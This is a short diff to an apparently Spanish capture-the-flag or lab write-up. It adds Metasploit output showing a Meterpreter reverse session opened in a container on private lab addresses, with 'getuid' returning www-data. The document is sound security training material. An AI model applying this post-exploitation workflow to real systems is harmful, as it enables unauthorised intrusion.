@@ -267,9 +267,12 @@ Info:
 [*] Sending stage (41224 bytes) to 10.0.4.91
 [*] Meterpreter session 1 opened (10.0.4.12:4444 -> 10.0.4.91:58680) at 2026-02-10 21:31:36 +0100
 
+meterpreter > getuid
+Server username: www-data
+meterpreter >
 ```
 
-¡Tenemos sesión de `Meterpreter` en el contenedor!
+¡Tenemos sesión de `Meterpreter` en el contenedor como usuario `www-data`!
 
 # MOVIMIENTO LATERAL (CONTENEDOR)
 
